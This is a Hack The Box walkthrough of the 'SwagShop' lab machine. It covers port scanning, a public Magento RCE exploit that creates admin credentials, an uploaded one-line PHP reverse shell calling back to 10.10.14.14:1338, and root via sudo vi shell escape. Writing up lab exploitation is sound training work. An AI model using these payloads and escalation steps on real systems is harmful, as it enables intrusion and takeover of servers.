@@ -1,0 +1,88 @@
+10.10.10.140
+
+SwagShop
+
+Starting off as always by recon and enumeration....
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
+|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
+|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Home page
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+b355a9e0cd018d3f7f03607141518419 cyrpt key from config 
+
+After enumeration we travel to the web app and check for vulns and other 
+things that maybe laying around. After digging around we find that is running a vulnerable version of Magento eCommerce. 
+
+It suffers from a rce and we can test our exploit. Our script takes some editing so we must change target = "http://target.com/" to target = "http://10.10.10.140/index.php/".
+
+Exploit can be found here..
+https://www.exploit-db.com/exploits/37977
+
+---------------------------------------------------------------------------
+root:/home/user/Downloads:# python 37977.py
+WORKED
+Check http://10.10.10.140/index.php/admin with creds forme:forme
+
+Next we log into the Mangneto web panel with the new creds we been given. We get to our reverse shell by uploading one into here System->Filesystem->IDE.
+
+The code I used was a typical php reverse shell embedded into the filesystem in the IDE.
+
+----------------------------------------------------------------------------------------
+<?php
+$sock=fsockopen("10.10.14.14", 1338);exec("/bin/sh -i <&3 >&3 2>&3");
+<?php
+----------------------------------------------------------------------------------------
+
+After calling our file that was edited we gain entry we travel to the home directory and check for user flag and we find haris users home directory.
+
+
+$ bash
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+cd /home
+ls
+haris
+cd haris
+ls
+user.txt
+cat user.txt
+a448877277e8*****************
+
+We then upload a recon script LinEnum.sh and see that we have a way to root right away by using vi. Can find techniques like these by looking up gtfobins in here https://gtfobins.github.io/.
+
+We see its vulnerable to a vi privlage escalation. 
+
+***Possible Sudo PWNAGE!
+lrwxrwxrwx 1 root root 20 May  2 14:36 /usr/bin/vi -> /etc/alternatives/vi
+
+After booting up vi we use 
+vi
+:set shell=/bin/sh
+:shell
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/root.txt
+c2b087d66e14a6*******************
+
+   ___ ___
+ /| |/|\| |\
+/_| ´ |.` |_\           We are open! (Almost)
+  |   |.  |
+  |   |.  |         Join the beta HTB Swag Store!
+  |___|.__|       https://hackthebox.store/password
+
+                   PS: Use root flag as password!
+
+
+Voilia we have root!
+
+Good day and Hacktheplanet!
+
+
+-------------------------------------------------------------------------------
